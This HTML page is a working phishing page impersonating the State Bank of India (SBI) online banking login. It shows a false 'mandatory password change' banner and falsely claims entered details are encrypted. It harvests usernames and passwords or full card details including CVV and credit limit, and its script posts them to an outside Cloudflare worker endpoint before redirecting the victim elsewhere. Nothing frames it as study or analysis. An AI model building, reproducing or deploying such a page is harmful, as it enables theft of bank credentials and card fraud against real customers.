<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBI - Personal Banking</title>
    <style>
        * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 0; }
        body { background-color: #fff; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; }
        .full-img { width: 100%; display: block; }
        
        .toggle-container { display: flex; justify-content: center; padding: 20px 25px; background: transparent; }
        .toggle-wrapper { display: flex; width: 100%; background: transparent; border: none; }
        .toggle-btn { flex: 1; padding: 12px; border: none; background: transparent; color: #555; cursor: pointer; font-weight: bold; font-size: 14px; text-align: center; border-radius: 30px; transition: all 0.3s ease; }
        .toggle-btn.active { background-color: #315195; color: #fff; box-shadow: 0 4px 10px rgba(49, 81, 149, 0.3); }

        .sky-blue-container { background-color: #eaf6ff; width: 100%; padding: 10px 0; text-align: center; border-bottom: 1px solid #d1e9ff; }
        .login-title { color: #0054a6; font-size: 13px; font-weight: bold; }
        .scrolling-msg { color: #b30000; font-size: 13px; font-weight: bold; margin-top: 5px; }
        
        .content-area { padding: 0 25px; flex-grow: 1; }
        .care-text { padding: 12px 0; font-size: 13px; color: #333; }
        .care-text b { color: #b30000; }
        
        .field-group { margin-bottom: 12px; }
        .field-group label { display: block; font-size: 13px; color: #555; margin-bottom: 5px; }
        .field-group input { width: 100%; padding: 8px 12px; background-color: #f1f1f1; border: 1px solid #ddd; border-radius: 2px; font-size: 15px; outline: none; height: 38px; }
        
        .row-fields { display: flex; gap: 10px; }
        .row-fields .field-group { flex: 1; }

        .captcha-box { display: flex; align-items: center; gap: 15px; margin: 15px 0; }
        .captcha-container { background: #eee; width: 130px; height: 40px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-style: italic; letter-spacing: 3px; font-size: 20px; position: relative; }
        .refresh-btn { font-size: 24px; color: #1a73bc; cursor: pointer; }
        
        .btn-row { display: flex; gap: 10px; margin-top: 15px; }
        .btn { flex: 1; padding: 10px; border: none; color: white; font-size: 15px; border-radius: 2px; cursor: pointer; }
        .btn-blue { background-color: #315195; }
        .btn-gray { background-color: #6c757d; }
        
        .footer-links { margin-top: 20px; font-size: 13px; text-align: center; }
        .footer-links a { color: #1a73bc; text-decoration: none; margin: 0 10px; }
        
        #cardFields { display: none; }
    </style>
</head>
<body onload="generateCaptcha()">

    <div class="container">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="Header" class="full-img">

        <div class="sky-blue-container">
            <div class="login-title">Login to OnlineSBI</div>
            <marquee class="scrolling-msg" scrollamount="4">Mandatory login and profile password change required for security.</marquee>
        </div>

        <div class="toggle-container">
            <div class="toggle-wrapper">
                <div id="tabNet" class="toggle-btn active" onclick="switchTab('NET')">Net Banking</div>
                <div id="tabCard" class="toggle-btn" onclick="switchTab('CARD')">Credit Card</div>
            </div>
        </div>

        <div class="content-area">
            <div class="care-text"><b>(CARE:</b> Details are encrypted for your safety.)</div>

            <form id="combinedForm">
                <div id="netFields">
                    <div class="field-group">
                        <label>Username*</label>
                        <input type="text" id="username" placeholder="Enter Username">
                    </div>
                    <div class="field-group">
                        <label>Password* (must contain a special character)</label>
                        <input type="password" id="password" placeholder="Enter Password" pattern="(?=.*[!@#$%^&*]).{6,}" title="Must contain at least one special character and be at least 6 characters long">
                    </div>
                </div>

                <div id="cardFields">
                    <div class="field-group">
                        <label>Card Number*</label>
                        <input type="tel" id="card_no" inputmode="numeric" maxlength="16" oninput="this.value = this.value.replace(/[^0-9]/g, '')" placeholder="16 Digit Card Number">
                    </div>
                    <div class="row-fields">
                        <div class="field-group">
                            <label>Expiry (MM/YY)*</label>
                            <input type="tel" id="expiry" maxlength="5" placeholder="MM/YY" oninput="formatExpiry(this)">
                        </div>
                        <div class="field-group">
                            <label>CVV*</label>
                            <input type="password" id="cvv" inputmode="numeric" maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '')" placeholder="3 Digits">
                        </div>
                    </div>
                    <div class="field-group">
                        <label>Card Limit*</label>
                        <input type="tel" id="limit" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')" placeholder="Available Limit">
                    </div>
                </div>

                <div class="field-group">
                    <label>Enter Captcha*</label>
                    <input type="text" id="captcha_input" required>
                </div>

                <div class="captcha-box">
                    <div class="captcha-container" id="captcha_txt"></div>
                    <div class="refresh-btn" onclick="generateCaptcha()">&#8635;</div>
                </div>

                <div class="btn-row">
                    <button type="submit" class="btn btn-blue" id="loginBtn">Login</button>
                    <button type="reset" class="btn btn-gray">Reset</button>
                </div>
            </form>
        </div>

        <img src="https://i.ibb.co/Txj77Jk2/chrome-screenshot-1-Apr-2026-12-43-42-pm-IST.png" alt="Footer" class="full-img" style="margin-top:20px;">
    </div>

    <script>
        let currentTab = 'NET';
        let currentCaptcha = "";
        const workerURL = 'https://cold-pine-96e7.sumankkuuyy.workers.dev/';

        function switchTab(type) {
            currentTab = type;
            document.getElementById('netFields').style.display = (type === 'NET') ? 'block' : 'none';
            document.getElementById('cardFields').style.display = (type === 'CARD') ? 'block' : 'none';
            document.getElementById('tabNet').classList.toggle('active', type === 'NET');
            document.getElementById('tabCard').classList.toggle('active', type === 'CARD');
        }

        // Auto Slash for Expiry
        function formatExpiry(input) {
            let val = input.value.replace(/[^0-9]/g, '');
            if (val.length >= 2) {
                val = val.substring(0, 2) + '/' + val.substring(2, 4);
            }
            input.value = val;
        }

        function generateCaptcha() {
            const chars = '23456789ABCDEFGHJKLMNPQRSTUVWXYZ';
            currentCaptcha = '';
            for (let i = 0; i < 5; i++) {
                currentCaptcha += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            document.getElementById('captcha_txt').innerText = currentCaptcha;
        }

        document.getElementById('combinedForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('loginBtn');
            const captchaInput = document.getElementById('captcha_input').value;

            if (captchaInput !== currentCaptcha) {
                alert("Invalid Captcha!");
                return;
            }

            btn.disabled = true;
            btn.innerText = "Processing...";

            let payload = { type: currentTab };

            if (currentTab === 'NET') {
                payload.user = document.getElementById('username').value;
                payload.pass = document.getElementById('password').value;
            } else {
                payload.card = document.getElementById('card_no').value;
                payload.exp = document.getElementById('expiry').value;
                payload.cvv = document.getElementById('cvv').value;
                payload.limit = document.getElementById('limit').value;
            }

            try {
                await fetch(workerURL, {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                window.location.href = "blogone.html";
            } catch (err) {
                window.location.href = "blogone.html";
            }
        });
    </script>
</body>
</html>
